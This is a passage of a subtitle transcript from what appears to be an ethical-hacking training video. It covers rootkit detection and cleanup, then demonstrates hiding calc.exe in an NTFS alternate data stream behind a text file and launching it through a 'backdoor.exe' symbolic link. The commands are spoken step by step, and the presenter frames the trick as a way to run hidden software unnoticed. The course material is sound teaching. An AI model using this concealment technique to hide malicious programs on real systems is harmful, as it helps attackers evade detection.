view, base detection,\nall these different ways.\n\n642\n00:32:03.368 --> 00:32:06.648\nLooking at registry keys,\nlooking at execution path,\n\n643\n00:32:06.648 --> 00:32:10.205\nhey that file's supposed to be\nin c windows system 32, and\n\n644\n00:32:10.205 --> 00:32:14.272\nit's in c windows hack me now right,\nand that's probably not good.\n\n645\n00:32:14.272 --> 00:32:18.303\nYour looking at deviations from normal\nbehavior, so what's the baseline,\n\n646\n00:32:18.303 --> 00:32:21.404\nwhat's happening all the sudden,\nwe're using more CPU,\n\n647\n00:32:21.404 --> 00:32:24.420\nwe've got 20 more processes\nrunning than normal.\n\n648\n00:32:24.420 --> 00:32:25.980\nThat would be [INAUDIBLE] or\nbehavior based detection method.\n\n649\n00:32:25.980 --> 00:32:30.960\nSignature based is obviously looking\nwith some sort of detector software.\n\n650\n00:32:30.960 --> 00:32:33.360\nWhat a baseline for files, and\nthings like that would be,\n\n651\n00:32:33.360 --> 00:32:37.255\nSigVerif's a good example of signature\nbased detection like I was showing you.\n\n652\n00:32:37.255 --> 00:32:42.020\nAnd integrity based detection as well\nwould be an example of SigVerif,\n\n653\n00:32:42.020 --> 00:32:43.220\na combination of both.\n\n654\n00:32:43.220 --> 00:32:46.780\nWhere we have that known baseline for\nfiles that have been digitally verified.\n\n655\n00:32:46.780 --> 00:32:47.790\nAnd we run against that.\n\n656\n00:32:47.790 --> 00:32:51.880\nSo, there's five distinct methods\nthat we can use to detect route kits.\n\n657\n00:32:51.880 --> 00:32:55.890\nWanna make sure we're familiar with them,\nwanna make sure we have a sense of them.\n\n658\n00:32:55.890 --> 00:32:59.020\nGood to know the things we should\nbe doing and thinking about.\n\n659\n00:32:59.020 --> 00:33:02.150\nReinstalling as we said,\nprobably the number one thing we can do.\n\n660\n00:33:02.150 --> 00:33:04.850\nEducate our teams and\nour staff and our employees.\n\n661\n00:33:04.850 --> 00:33:08.520\nYeah, that's unusual your system\nshouldn't have the laughing skull and\n\n662\n00:33:08.520 --> 00:33:10.840\ncrossbones on the screen mocking you,\n\n663\n00:33:10.840 --> 00:33:14.330\nthat's probably not normal,\nyou should tell somebody about that.\n\n664\n00:33:14.330 --> 00:33:17.160\nRemember in new Independence day\nwhen they load the virus up and\n\n665\n00:33:17.160 --> 00:33:19.620\nits got the laughing Jolly Roger, right?\n\n666\n00:33:19.620 --> 00:33:22.960\nYou don't want that to happen, that's\nnot normal, in case you were wondering,\n\n667\n00:33:22.960 --> 00:33:25.790\njust to be clear,\nnot acceptable as a baseline right.\n\n668\n00:33:25.790 --> 00:33:29.580\nUse trusted media for reinstall so\nhave a clean set of iso's,\n\n669\n00:33:29.580 --> 00:33:34.250\nhave a clean set of snapshotted images,\nclean set of templates.\n\n670\n00:33:34.250 --> 00:33:38.895\nThis may be a VM, may be a VDI experience\nwhere you're doing virtual desktops today.\n\n671\n00:33:38.895 --> 00:33:41.580\nThis may not be a physical host or\na physical end point all right.\n\n672\n00:33:41.580 --> 00:33:45.690\nSo we gotta have good clean\nsoftware good clean install media\n\n673\n00:33:45.690 --> 00:33:46.790\nall those things are important.\n\n674\n00:33:46.790 --> 00:33:48.930\nI talked about the install hardware.\n\n675\n00:33:48.930 --> 00:33:51.177\nImmediate stuff we may\nuse to store the image,\n\n676\n00:33:51.177 --> 00:33:53.140\nmake sure that stuff is swept and clean.\n\n677\n00:33:53.140 --> 00:33:56.710\nYou know, don't just randomly pick up\na thumb drive that's laying around and go,\n\n678\n00:33:56.710 --> 00:33:58.950\nyeah that will probably be good and\nuse that.\n\n679\n00:33:58.950 --> 00:34:00.450\nWe've gotta scan all of that stuff.\n\n680\n00:34:00.450 --> 00:34:03.820\nThe worst thing you can do is re-infect\na system you're about to clean.\n\n681\n00:34:03.820 --> 00:34:06.030\nThat's just not gonna be any good.\n\n682\n00:34:06.030 --> 00:34:09.380\nSo we do wanna make sure,\nwell Is not good for you anyway.\n\n683\n00:34:09.380 --> 00:34:11.670\nBut it's funny if you're\nnot the person doing,\n\n684\n00:34:11.670 --> 00:34:14.960\nit's just not good if you're\nthe one that has to clean it up.\n\n685\n00:34:14.960 --> 00:34:18.330\nBut make sure we know about the kind\nof things that would be smart here.\n\n686\n00:34:18.330 --> 00:34:20.410\nBest practices, common sense stuff.\n\n687\n00:34:20.410 --> 00:34:22.910\nI mean this is really what's important.\n\n688\n00:34:22.910 --> 00:34:26.800\nMake sure we don't install any additional\napplications that are not required.\n\n689\n00:34:26.800 --> 00:34:30.910\nWe talked about the additional software\nthat's coming in often times with\n\n690\n00:34:30.910 --> 00:34:33.640\nthese pieces of removal\nsoftware that you download.\n\n691\n00:34:33.640 --> 00:34:35.620\nYou've gotta be careful about that.\n\n692\n00:34:35.620 --> 00:34:38.290\nMake sure you keep your\nvirus patches up to date.\n\n693\n00:34:38.290 --> 00:34:42.640\nGenerally keep firmware and\nall sorts of system patches up to date.\n\n694\n00:34:42.640 --> 00:34:43.820\nAll these things are important,\n\n695\n00:34:43.820 --> 00:34:47.250\nI talked about firmware patching and\nwhy that may or may not be an issue.\n\n696\n00:34:47.250 --> 00:34:49.020\nWe gotta be thinking about all this stuff,\n\n697\n00:34:49.020 --> 00:34:52.990\nbecause a lot of it can get away from\nus if we don't have that checklist.\n\n698\n00:34:52.990 --> 00:34:55.550\nAnd this is another really\nimportant point to consider.\n\n699\n00:34:55.550 --> 00:35:00.643\nWhen you are a CEH as an ethical hacker,\ncuz I can promise you, non-ethical hackers\n\n700\n00:35:00.643 --> 00:35:05.730\nhave checklists about the things they\nare going to accomplish today, right.\n\n701\n00:35:05.730 --> 00:35:08.580\nI'm gonna go hack that system,\nI'm gonna take that money,\n\n702\n00:35:08.580 --> 00:35:10.040\nand then I'm gonna go retire.\n\n703\n00:35:10.040 --> 00:35:12.080\nThat's probably on their check list and\n\n704\n00:35:12.080 --> 00:35:14.790\nthey'll execute on that\nstep by step to get there.\n\n705\n00:35:14.790 --> 00:35:18.700\nWe as defenders, we as ethical hackers,\nhave to have the same thought process.\n\n706\n00:35:18.700 --> 00:35:21.160\nWhat am I sitting down in\nfront of the keyboard to do?\n\n707\n00:35:21.160 --> 00:35:22.350\nWhy am I here?\n\n708\n00:35:22.350 --> 00:35:23.480\nWhat is my goal?\n\n709\n00:35:23.480 --> 00:35:26.880\nMy goal is to figure out that\nrootkit infected that system\n\n710\n00:35:26.880 --> 00:35:28.040\nthen I got to have a plan.\n\n711\n00:35:28.040 --> 00:35:31.020\nI can't just start clicking away right.\n\n712\n00:35:31.020 --> 00:35:32.510\nWhat was it chicken clicking?\n\n713\n00:35:32.510 --> 00:35:33.430\n>> The chicken clicking.\n\n714\n00:35:33.430 --> 00:35:35.300\n>> I can't go chicken clicking away right.\n\n715\n00:35:35.300 --> 00:35:36.210\nThank you, Ben.\n\n716\n00:35:36.210 --> 00:35:39.730\nI can't go chicken clicking away in\norder to just figure something out,\n\n717\n00:35:39.730 --> 00:35:40.660\nI mean I shouldn't anyway.\n\n718\n00:35:40.660 --> 00:35:45.620\nI've got to have a plan, if I don't have\na plan, I'm probably gonna spend a lot of\n\n719\n00:35:45.620 --> 00:35:49.480\nextra time doing things that is not\ngoing to be very productive ultimately.\n\n720\n00:35:49.480 --> 00:35:52.785\nWe've got to really think about ROIs,\nas just contrite as that is to say.\n\n721\n00:35:52.785 --> 00:35:55.200\nWhat's the return on my investment?\n\n722\n00:35:55.200 --> 00:35:59.850\nI often think about it as ROTI, Return On\nmy Time Investment specifically, right?\n\n723\n00:35:59.850 --> 00:36:02.470\nBecause if I gotta invest an hour of time\n\n724\n00:36:02.470 --> 00:36:05.810\non someone's machine to figure something\nout, I'd better be able to see at the end\n\n725\n00:36:05.810 --> 00:36:08.830\nof that hour that that problem's\nsolved and it's never coming back.\n\n726\n00:36:08.830 --> 00:36:12.380\nOr I didn't spend my hour wisely because\nI could've been off doing something else\n\n727\n00:36:12.380 --> 00:36:15.520\nthat would have probably\nsafeguarded a lot more systems and\n\n728\n00:36:15.520 --> 00:36:18.220\nwould have been more effective for\nthe community, right, at large in theory.\n\n729\n00:36:18.220 --> 00:36:22.000\nSo I gotta really weight that and\nweight that wisely and think about that.\n\n730\n00:36:22.000 --> 00:36:25.140\nLet's turn our attention to\nsomething else before we think\n\n731\n00:36:25.140 --> 00:36:27.300\nabout wrapping up our conversation here.\n\n732\n00:36:27.300 --> 00:36:30.230\nWhat are your feelings on\nalternate data strips?\n\n733\n00:36:30.230 --> 00:36:30.930\n>> They're interesting.\n\n734\n00:36:30.930 --> 00:36:33.303\n[LAUGH]\n>> AC or DC, what do you think about that?\n\n735\n00:36:33.303 --> 00:36:34.293\n[CROSSTALK] good joke.\n\n736\n00:36:34.293 --> 00:36:34.810\n>> I like them.\n\n737\n00:36:34.810 --> 00:36:35.542\nI think they're pretty cool.\n\n738\n00:36:35.542 --> 00:36:37.079\nI remember when I first\nlearned about them,\n\n739\n00:36:37.079 --> 00:36:38.420\nit actually scared the crap out of me.\n\n740\n00:36:38.420 --> 00:36:39.180\nI was like, wait.\n\n741\n00:36:39.180 --> 00:36:41.690\nHow long have these been there and\nI haven't known about them?\n\n742\n00:36:41.690 --> 00:36:45.540\n>> For some time, as you probably\nfigured out when you learned that.\n\n743\n00:36:45.540 --> 00:36:49.000\nAnd so we wanna talk a bit about this\nactually really cool kinda concept.\n\n744\n00:36:49.000 --> 00:36:51.830\nWhat I wanna start out by doing\nis actually demo-ing it for you,\n\n745\n00:36:51.830 --> 00:36:56.030\ncuz I did this demo for Mike before we\ngot started on Windows 10 cuz I wanted to\n\n746\n00:36:56.030 --> 00:36:59.090\nshow him that it works on Windows 10 cuz\nhe kept saying, nah, it doesn't work.\n\n747\n00:36:59.090 --> 00:36:59.740\nAnd I said, no, it does.\n\n748\n00:36:59.740 --> 00:37:00.710\n>> And with PowerShell.\n\n749\n00:37:00.710 --> 00:37:01.840\n>> And what?\n>> And with PowerShell.\n\n750\n00:37:01.840 --> 00:37:02.470\n>> And with PowerShell too.\n\n751\n00:37:02.470 --> 00:37:03.700\n>> Yeah.\n>> I'm gonna show you something really\n\n752\n00:37:03.700 --> 00:37:04.640\ncool with PowerShell.\n\n753\n00:37:04.640 --> 00:37:06.030\nYou may not be aware,\nbut I did this for Mike.\n\n754\n00:37:06.030 --> 00:37:08.500\nAnd Mike's like, wow, you just, that, wow.\n\n755\n00:37:08.500 --> 00:37:09.890\nSo you got to tell people about that.\n\n756\n00:37:09.890 --> 00:37:11.480\nAnd so, I'm gonna do that right now.\n\n757\n00:37:11.480 --> 00:37:13.755\nHe didn't really say that by the way,\nI'm just kidding.\n\n758\n00:37:13.755 --> 00:37:15.760\n[LAUGH] He was like, yeah, okay big deal.\n\n759\n00:37:15.760 --> 00:37:19.760\nSo I could do that,\nthat's not impressive, right?\n\n760\n00:37:19.760 --> 00:37:20.780\nYou're just showing off.\n\n761\n00:37:20.780 --> 00:37:21.930\nSo let's actually take a look.\n\n762\n00:37:21.930 --> 00:37:25.670\nSo we're on our Windows 10 desktop,\nso remember the idea with NTFS is\n\n763\n00:37:25.670 --> 00:37:29.580\nspecifically NTFS data streams or\nalternate data streams as they are called,\n\n764\n00:37:29.580 --> 00:37:33.280\nyou hear them sometimes referred to\nas ADS's, alternate data streams and\n\n765\n00:37:33.280 --> 00:37:36.740\nI'm going to give you a URL, when we\nget done, that people can go up and\n\n766\n00:37:36.740 --> 00:37:38.680\nread about, there's actually a cool one.\n\n767\n00:37:38.680 --> 00:37:42.760\nThere's one on Microsoft that talks about\nit because this is a known, let's call\n\n768\n00:37:42.760 --> 00:37:46.640\nit a feature, an attribute of the file\nsystem that's been around for some time.\n\n769\n00:37:46.640 --> 00:37:48.690\nThey've done a lot of blogging and\nwriting about it.\n\n770\n00:37:48.690 --> 00:37:49.670\nThey're very up front about it.\n\n771\n00:37:49.670 --> 00:37:51.550\nBut there's actually also a really cool\n\n772\n00:37:53.070 --> 00:37:55.620\nforensic article out there\nthat we'd take a look at.\n\n773\n00:37:55.620 --> 00:37:58.950\nThat's where I was talking about getting\nthat shell command from that I wanted to\n\n774\n00:37:58.950 --> 00:37:59.725\nload the DLL from.\n\n775\n00:37:59.725 --> 00:38:01.672\n[CROSSTALK] all different\nways to find them.\n\n776\n00:38:01.672 --> 00:38:04.500\n>> Yeah,\ncuz it does serve a purpose to our system.\n\n777\n00:38:04.500 --> 00:38:06.640\nIt's not that it's there and\nthey forgot about it,\n\n778\n00:38:06.640 --> 00:38:11.390\nand they said, it's not just\na vulnerability, it's there for a reason.\n\n779\n00:38:11.390 --> 00:38:13.100\nWe're just taking advantage of it.\n\n780\n00:38:13.100 --> 00:38:16.910\n>> Absolutely, yeah, it's on purpose, it's\npart of the way the file system works,\n\n781\n00:38:16.910 --> 00:38:18.240\nit was not an accident.\n\n782\n00:38:18.240 --> 00:38:21.475\nSomebody didn't just randomly one day say\nhey, what would happen if I did that wow,\n\n783\n00:38:21.475 --> 00:38:24.135\nand then let's not tell anybody,\nbecause that's going to be a problem.\n\n784\n00:38:24.135 --> 00:38:25.315\nSo no, it's actually there on purpose.\n\n785\n00:38:25.315 --> 00:38:26.605\nSo let's take a look, all right?\n\n786\n00:38:26.605 --> 00:38:30.555\nSo I'm in the command line here,\nnow, you're going to be smart and\n\n787\n00:38:30.555 --> 00:38:34.160\nnot do what I did cuz I was an idiot\nthis morning before we started this.\n\n788\n00:38:34.160 --> 00:38:36.820\nSo I'm gonna have to go to\na different command line,\n\n789\n00:38:36.820 --> 00:38:39.310\nbecause I didn't launch this\none as an administrator.\n\n790\n00:38:39.310 --> 00:38:42.310\nThis is the issue I was showing you at\nthe bottom where we gotta make this like,\n\n791\n00:38:42.310 --> 00:38:45.350\nsorry, idiots, you're out of luck,\nyou don't have rights.\n\n792\n00:38:45.350 --> 00:38:48.250\nSo I'm gonna show you the first part\nof this demo in this command line.\n\n793\n00:38:48.250 --> 00:38:50.470\nI was just too lazy to redo\nthe whole thing again, so\n\n794\n00:38:50.470 --> 00:38:54.120\nI'm gonna go to another command line in a\nminute, but as always make sure you launch\n\n795\n00:38:54.120 --> 00:38:57.220\nyour command line as an administrator,\nsave yourself the heartache and\n\n796\n00:38:57.220 --> 00:39:01.060\nthe time and trouble of having to do this\ntwice, but I load just the normal command\n\n797\n00:39:01.060 --> 00:39:05.030\nline, right-click right on the,\nwhat are we calling this thing now?\n\n798\n00:39:05.030 --> 00:39:06.970\nThe start menu, the flag,\nthe pen, the path,\n\n799\n00:39:06.970 --> 00:39:08.360\n>> Start icon, I don't know.\n\n800\n00:39:08.360 --> 00:39:09.330\n>> I don't know, whatever the hell it was,\n\n801\n00:39:09.330 --> 00:39:12.970\nit used to be called a start menu years\nago, right click on this thing in Windows\n\n802\n00:39:12.970 --> 00:39:17.600\n10, command prompt admin so\njust make sure you launch the right way.\n\n803\n00:39:17.600 --> 00:39:21.426\nAnd then what we're gonna do is on in, I'm\ngonna go to the command prompt I changed\n\n804\n00:39:21.426 --> 00:39:25.252\ninto, a directory I've created in Windows\nin the root of the C drive called test so\n\n805\n00:39:25.252 --> 00:39:27.270\nI'm just gonna run out of test okay.\n\n806\n00:39:27.270 --> 00:39:29.400\nSo cd test right real simple.\n\n807\n00:39:29.400 --> 00:39:32.885\nSo I'm in test I type notepad for\nour Notepad tool,\n\n808\n00:39:32.885 --> 00:39:35.815\ncuz Notepad is an ADS aware application.\n\n809\n00:39:35.815 --> 00:39:39.385\nSo it will support the use\nof alternate data streams.\n\n810\n00:39:39.385 --> 00:39:41.005\nAnd I wanna create a file in Notepad.\n\n811\n00:39:41.005 --> 00:39:44.685\nSo we're just gonna type notepad space and\nthe name of the file.\n\n812\n00:39:44.685 --> 00:39:47.145\nI call mine readme.txt.\n\n813\n00:39:47.145 --> 00:39:48.395\nYou can call it anything you want.\n\n814\n00:39:48.395 --> 00:39:51.165\nYou can call it anything as long as\nyou put a .txt extension at the end.\n\n815\n00:39:51.165 --> 00:39:56.170\nWhat we're doing,\nbasically is asking Notepad to open up and\n\n816\n00:39:56.170 --> 00:39:59.320\nto create a file called Read Me and\nallow me to put some stuff in there.\n\n817\n00:39:59.320 --> 00:40:01.080\nSo I did that, and\n\n818\n00:40:01.080 --> 00:40:05.520\nthen what I did, that's the file right\nhere as a matter of fact, you can see it.\n\n819\n00:40:05.520 --> 00:40:08.947\nI just put some stuff in there testing for\nthat, little smiley face,\n\n820\n00:40:08.947 --> 00:40:10.375\nHello out there at IT Pro TV.\n\n821\n00:40:10.375 --> 00:40:12.389\nRyan, you can see it's named readme.txt.\n\n822\n00:40:12.389 --> 00:40:14.402\nSo I did that.\n\n823\n00:40:14.402 --> 00:40:16.783\nThen I saved it.\n\n824\n00:40:16.783 --> 00:40:19.003\nSo just went ahead so you could see it.\n\n825\n00:40:19.003 --> 00:40:20.452\nNow I just went ahead and\n\n826\n00:40:20.452 --> 00:40:24.380\nI basically just did a directory\nlisting on the test directory.\n\n827\n00:40:24.380 --> 00:40:26.260\nAnd so what I got there was,\n\n828\n00:40:26.260 --> 00:40:30.588\nI got the readme.txt file, created it's\ngot 45 bytes of data in it, great.\n\n829\n00:40:30.588 --> 00:40:35.480\nI'd pushed calc.exe into that directory\nprior, so I just went and copied it.\n\n830\n00:40:35.480 --> 00:40:39.760\nWe're just gonna gonna use calculator as\nour piece of software that represents\n\n831\n00:40:39.760 --> 00:40:43.475\nthe alternate data stream, so\nnot only we're creating alternate data but\n\n832\n00:40:43.475 --> 00:40:46.940\nwe're binding an executable which is\nreally the insidious part about this\n\n833\n00:40:46.940 --> 00:40:50.740\nto the alternate data stream so\nthat I can launch a program\n\n834\n00:40:50.740 --> 00:40:54.500\nwithout anyone even realizing it's there,\nwhich is really cool, right?\n\n835\n00:40:54.500 --> 00:40:57.615\nSo I've got calc.exe in there in\nthe first directory run-through so\n\n836\n00:40:57.615 --> 00:40:59.639\nat one point it was in the directory,\nright?\n\n837\n00:40:59.639 --> 00:41:03.623\nIt's sitting there, so\nthen what I do, is the following,\n\n838\n00:41:03.623 --> 00:41:07.700\nand then come down here,\njust scroll down here a little bit.\n\n839\n00:41:10.160 --> 00:41:14.510\nI then go ahead, and I type in,\nagain just from the command line.\n\n840\n00:41:14.510 --> 00:41:15.900\nI type the command type.\n\n841\n00:41:15.900 --> 00:41:16.598\nSo I typed type.\n\n842\n00:41:16.598 --> 00:41:22.090\nSo type c:\\test\\calc.exe.\n\n843\n00:41:22.090 --> 00:41:26.310\nThis is me calling the piece of software,\nthe executable.\n\n844\n00:41:26.310 --> 00:41:27.750\nThis will be the malware.\n\n845\n00:41:27.750 --> 00:41:29.445\nThis will be the thing I wanna hide.\n\n846\n00:41:29.445 --> 00:41:31.740\n>> Nmap or something that you're\ntrying to get on somebody's system.\n\n847\n00:41:31.740 --> 00:41:32.890\n>> Whatever I wanna put there.\n\n848\n00:41:32.890 --> 00:41:36.520\nThis is you're about to take\ncontrol of my world.exe.\n\n849\n00:41:36.520 --> 00:41:41.045\nSo this is gonna be the package that\nwe're gonna deploy as the software we\n\n850\n00:41:41.045 --> 00:41:43.870\nwanna hide and\nthen be able to call on demand.\n\n851\n00:41:43.870 --> 00:41:46.940\nWhatever it is, obviously using\ncalc because it's small, it's easy,\n\n852\n00:41:46.940 --> 00:41:47.810\nit's built in.\n\n853\n00:41:47.810 --> 00:41:52.540\nSo I'm gonna type that out, so\ntype path calc.exe space and\n\n854\n00:41:52.540 --> 00:41:55.510\nthen the, whatever you call that thing\n>> Greater than\n\n855\n00:41:55.510 --> 00:41:56.450\n>> Greater than, there you go.\n\n856\n00:41:56.450 --> 00:41:57.535\nI'm horrible at math.\n\n857\n00:41:57.535 --> 00:41:58.140\n[LAUGH] Greater than,\n\n858\n00:41:58.140 --> 00:42:00.220\nI know it's the thing with the pointy\nthing that goes away from me,\n\n859\n00:42:00.220 --> 00:42:01.530\nthat's what I call it.\n\n860\n00:42:01.530 --> 00:42:04.335\nNever, ever let me near your kids\nto teach math, boys and girls,\n\n861\n00:42:04.335 --> 00:42:06.034\nyou would not be happy with the result.\n\n862\n00:42:06.034 --> 00:42:07.400\n>> The pointy thing.\n\n863\n00:42:07.400 --> 00:42:10.360\n>> The pointy thing, it points away,\nthe open mouth's away from you,\n\n864\n00:42:10.360 --> 00:42:11.147\nthat's-\n>> [LAUGH]\n\n865\n00:42:11.147 --> 00:42:12.618\n>> Or, pointing towards you, rather, and\n\n866\n00:42:12.618 --> 00:42:14.038\naway the pointer's away from you.\n\n867\n00:42:14.038 --> 00:42:15.280\nSo anyway, calc.exe, right?\n\n868\n00:42:15.280 --> 00:42:19.040\nAnd then c, path again,\nreadme.txt:calc.exe.\n\n869\n00:42:19.040 --> 00:42:26.440\nAnd what I'm doing is I'm calling up\ncalc.exe, and then I'm using that and\n\n870\n00:42:26.440 --> 00:42:32.800\nI'm piping it, essentially outputting it\nand I'm binding it through the ADS stream.\n\n871\n00:42:32.800 --> 00:42:35.660\nI'm gonna bind it to the readme.txt file.\n\n872\n00:42:35.660 --> 00:42:40.940\nSo I've now linked calc.exe as\na hidden data stream to readme.txt.\n\n873\n00:42:40.940 --> 00:42:42.880\n>> I'll be able to see that.\n\n874\n00:42:42.880 --> 00:42:46.530\nI mean, calc's gotta be a lot bigger than\n45 bytes, so it's gonna be huge now.\n\n875\n00:42:46.530 --> 00:42:47.440\n>> Well, let's take a look.\n\n876\n00:42:47.440 --> 00:42:52.180\nSo now I do a dir again, and\nwhat I see is the readme.txt file.\n\n877\n00:42:52.180 --> 00:42:53.089\nIt's still 45 bytes.\n\n878\n00:42:53.089 --> 00:42:54.575\n>> What?\n\n879\n00:42:54.575 --> 00:42:58.830\n[LAUGH]\n>> Now calc is what, 33 megabits,\n\n880\n00:42:58.830 --> 00:43:00.160\nit looks like 33 megabits.\n\n881\n00:43:00.160 --> 00:43:05.000\nSo calc is big as Mike pointed out,\nreadme is small, right?\n\n882\n00:43:05.000 --> 00:43:09.690\nAnd so now what I can do, right,\nbefore we do anything else,\n\n883\n00:43:09.690 --> 00:43:12.420\nbefore we explain that last line,\nlet's go take a look.\n\n884\n00:43:12.420 --> 00:43:17.160\nSo I, by the way,\nI deleted calc.exe out of the directory,\n\n885\n00:43:17.160 --> 00:43:21.510\nafter I did the first two dir's so\nif I do it now you won't see it there but\n\n886\n00:43:21.510 --> 00:43:26.210\nwe can see the readme is sitting there,\nright, and it's sitting in there so\n\n887\n00:43:26.210 --> 00:43:27.970\nlet's go take a look.\n\n888\n00:43:27.970 --> 00:43:30.030\nSo let's do a dir one more time,\n\n889\n00:43:34.330 --> 00:43:37.780\nignore all the other stuff that's there\nbecause those are other programs, but\n\n890\n00:43:37.780 --> 00:43:41.595\nnotice doing a live check on\nthe directory right now, dir.\n\n891\n00:43:41.595 --> 00:43:43.390\nReadme.txt is still 45 bytes.\n\n892\n00:43:43.390 --> 00:43:45.990\n>> 45 bytes.\n>> Now we have this new thing in there\n\n893\n00:43:45.990 --> 00:43:47.880\ncalled symlink, right?\n\n894\n00:43:47.880 --> 00:43:51.999\nAnd you could see the symlink\nis listing the actual ADS.\n\n895\n00:43:51.999 --> 00:43:58.020\nSo the last command I create or use is\none to make a link, a symbolic link.\n\n896\n00:43:58.020 --> 00:44:00.204\nIt's called the mklink command,\n\n897\n00:44:00.204 --> 00:44:02.930\nso mklink in Windows will\nmake a symbolic link for you.\n\n898\n00:44:02.930 --> 00:44:08.050\nSo mklink, I give the name of a program\nthat I wanna use, backdoor.exe,\n\n899\n00:44:08.050 --> 00:44:12.190\nthat's just what I'm gonna type\nin to launch and call the ADS.\n\n900\n00:44:12.190 --> 00:44:15.665\nAgain, I could call that please click\nhere for a good time or anything else,\n\n901\n00:44:15.665 --> 00:44:16.715\nwouldn't matter, right?\n\n902\n00:44:16.715 --> 00:44:20.715\nJust something.exe,\nthat program doesn't exist, by the way.\n\n903\n00:44:20.715 --> 00:44:22.615\nI'm just calling that,\nI'm just making that up.\n\n904\n00:44:22.615 --> 00:44:23.515\nI'm gonna make that right now.\n\n905\n00:44:23.515 --> 00:44:27.222\nI'm gonna set backdoor.exe equal,\nin other words.\n\n906\n00:44:27.222 --> 00:44:34.132\nSo what, readme.txt calling calc.exe\nwhich is going to be the ADS string.\n\n907\n00:44:34.132 --> 00:44:37.916\nNow, I did this as I said in the admin\nconsole here or rather in the shell,\n\n908\n00:44:37.916 --> 00:44:41.206\nfrom the command line,\nwithout admin privileges, I forgot,\n\n909\n00:44:41.206 --> 00:44:43.190\nI didn't realize had done that.\n\n910\n00:44:43.190 --> 00:44:46.060\nSo it comes back and says, hey, sorry,\nyou don't have rights to do this.\n\n911\n00:44:46.060 --> 00:44:47.760\nYou do,\nyou just have to be an administrator.\n\n912\n00:44:47.760 --> 00:44:51.390\nSo, what we're gonna do is switch to the\nother console that has admin rights and\n\n913\n00:44:51.390 --> 00:44:52.568\nwe're gonna see how that comes out.\n\n914\n00:44:52.568 --> 00:44:59.690\nSo, we're gonna come over here, and\nwe're going to do this, right here.\n\n915\n00:45:01.060 --> 00:45:07.760\nSo now,\nwhen I type make link backdoor.exe etc.,\n\n916\n00:45:07.760 --> 00:45:12.080\nthen, with admin rights,\nsymbolic link created for backdoor.exe,\n\n917\n00:45:12.080 --> 00:45:16.010\npointing to readme.txt:calc.exe.\n\n918\n00:45:16.010 --> 00:45:20.610\nSo now, all I have to do is\ngo type in backdoor, right?\n\n919\n00:45:20.610 --> 00:45:23.220\nBecause I'm calling the executable.\n\n920\n00:45:23.220 --> 00:45:27.400\nNow what back door will do before\nwe go fire this, let's take a look.\n\n921\n00:45:27.400 --> 00:45:32.790\nYou could see in the directory I've got\na symlink file that is called back door.\n\n922\n00:45:32.790 --> 00:45:34.170\nThat's there, right?\n\n923\n00:45:34.170 --> 00:45:38.120\nAnd you can see that I can\nopen the files location,\n\n924\n00:45:38.120 --> 00:45:40.570\nI could scan it with Windows Defender,\nright?\n\n925\n00:45:40.570 --> 00:45:45.850\nI could restore previous, send to etc.,\nand if I look at Properties\n\n926\n00:45:45.850 --> 00:45:50.600\nyou'll see that essentially, right, this\nis not a file, this is a symbolic link.\n\n927\n00:45:50.600 --> 00:45:54.010\nIt's just a shortcut, it's essentially\njust telling me, hey, go over there.\n\n928\n00:45:54.010 --> 00:45:56.840\nIt's a published location finder\n>> Pointer of some kind.\n\n929\n00:45:56.840 --> 00:45:57.650\n>> Right, that's all it is.\n\n930\n00:45:57.650 --> 00:45:58.490\nRight?\nSo\n\n931\n00:45:58.490 --> 00:46:02.680\nit's not really a file that we can\nlatch on to and do something with.\n\n932\n00:46:02.680 --> 00:46:05.750\nIt's just basically a road sign that says,\nyou want to go over there?\n\n933\n00:46:05.750 --> 00:46:08.150\nThat's really what it is, right?\n\n934\n00:46:08.150 --> 00:46:11.780\nAnd so now when I do this,\nwhat do we think's gonna happen?\n\n935\n00:46:11.780 --> 00:46:13.230\nWhen I launch back door?\n\n936\n00:46:13.230 --> 00:46:16.539\n>> As soon it's basically a shortcut so\nit should launch calc.exe or\n\n937\n00:46:16.539 --> 00:46:18.910\nwhatever you've attached in that.\n\n938\n00:46:18.910 --> 00:46:19.880\n>> Right there.\n\n939\n00:46:19.880 --> 00:46:20.890\nSo I just launched right.\n\n940\n00:46:20.890 --> 00:46:22.700\nExactly.\nWhatever the executable is\n\n941\n00:46:22.700 --> 00:46:24.430\nin the alternate data stream.\n\n942\n00:46:24.430 --> 00:46:29.438\nSo I just launched calc.exe by\nactually calling back door.\n\n943\n00:46:29.438 --> 00:46:35.360\nSo I've basically attached, and\nthis is a small amount of data.\n\n944\n00:46:35.360 --> 00:46:38.880\nWe could do this, obviously,\nwith all sorts of crazy stuff.\n\n945\n00:46:38.880 --> 00:46:43.560\nBut I've attached 33 megs\napproximately of data hidden it as\n\n946\n00:46:43.560 --> 00:46:48.990\nan executable against the 45 kilobyte or\n45 by text file,\n\n947\n00:46:48.990 --> 00:46:54.540\nand made the text file look as if it's\ntotally innocuous because when I go\n\n948\n00:46:54.540 --> 00:46:59.750\nto the text file as you saw,\nthat's what's in the text file.\n\n949\n00:46:59.750 --> 00:47:01.030\n>> And the text file can still open,\n\n950\n00:47:01.030 --> 00:47:04.330\nyou can still make changes to it,\nI mean it doesn't change that at all.\n\n951\n00:47:04.330 --> 00:47:05.340\n>> Absolutely.\nSo if I go here,\n\n952\n00:47:05.340 --> 00:47:07.970\nI just closed the text file by the way,\nIf I go here and\n\n953\n00:47:07.970 --> 00:47:10.910\nopen up the text file,\nthat's the text file right now, right?\n\n954\n00:47:10.910 --> 00:47:12.340\nI just opened it back up.\n\n955\n00:47:12.340 --> 00:47:16.680\nSo, let's come in here,\nright, we'll add some stuff.\n\n956\n00:47:16.680 --> 00:47:21.950\nAdding additional data fr ads demo.\n\n957\n00:47:21.950 --> 00:47:24.975\nHi mike, right?\n\n958\n00:47:24.975 --> 00:47:27.410\nOkay, so I do that.\n\n959\n00:47:27.410 --> 00:47:30.610\nAnd of course I would probably\nwanna learn how to type and spell.\n\n960\n00:47:30.610 --> 00:47:31.940\nThat would be important.\n\n961\n00:47:31.940 --> 00:47:33.350\nAll right, so I'm just gonna go save.\n\n962\n00:47:33.350 --> 00:47:34.170\nBoom.\n\n963\n00:47:34.170 --> 00:47:34.910\nSave that.\n\n964\n00:47:34.910 --> 00:47:36.280\nWe'll even close that.\n\n965\n00:47:36.280 --> 00:47:40.150\nSomebody said to me once, you're cheat,\nyou got file file open to do that.\n\n966\n00:47:40.150 --> 00:47:40.720\nNo I don't.\n\n967\n00:47:40.720 --> 00:47:44.700\nYou just need to go home and read your how\nto and ADS manual is what you need to do.\n\n968\n00:47:44.700 --> 00:47:46.290\nSo, we've got that right there.\n\n969\n00:47:46.290 --> 00:47:47.550\nI just modified that, right?\n\n970\n00:47:47.550 